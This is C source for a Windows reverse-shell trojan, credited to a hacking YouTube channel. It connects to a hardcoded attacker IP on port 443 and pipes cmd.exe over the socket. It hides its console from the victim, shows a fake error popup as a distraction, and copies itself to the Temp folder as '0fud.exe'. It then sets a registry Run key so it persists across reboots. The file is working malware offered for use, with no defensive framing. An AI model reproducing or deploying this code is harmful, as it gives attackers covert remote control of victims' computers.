// >_ Author: wrongsid3
// >_ YT Channel: "Appunti da Hacker" 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <unistd.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 2048


void RunShell(char* attackerServer, int attackerPort) {
    while(true) {
            
	
	WSADATA wsaData = {0};
        SOCKET theSocket;
        sockaddr_in addr;
        WSAStartup(MAKEWORD(2,2), &wsaData);
        theSocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(attackerServer);  
        addr.sin_port = htons(attackerPort);    


        if (WSAConnect(theSocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) { 
            closesocket(theSocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(theSocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(theSocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) theSocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(theSocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(theSocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}


int main(int argc, char **argv) {


    FreeConsole(); // Hide command prompt to the victim
    if (argc == 3) {
        int port  = atoi(argv[2]); 
        RunShell(argv[1], port);
    }
    else {
        char host[] = "192.168.88.132";  // Attacker IP Address
        int port = 443;                  // Attacker listener PORT
        
        // Addictional features below
        Sleep(5); // 5 seconds start delay
        MessageBox(NULL, TEXT("Error AZ39284"), TEXT("Error Message"), MB_OK | MB_ICONERROR); // Generic error popup to distract the victim
        system("cmd /c copy .\\0fud.exe %Temp%");  // copy malware to temp folder
        system("cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"NewKey\" /t REG_SZ /F /D \"%Temp%\\0fud.exe"); //malware persistence via reg add
        
        RunShell(host, port);
    }
    return 0;
}
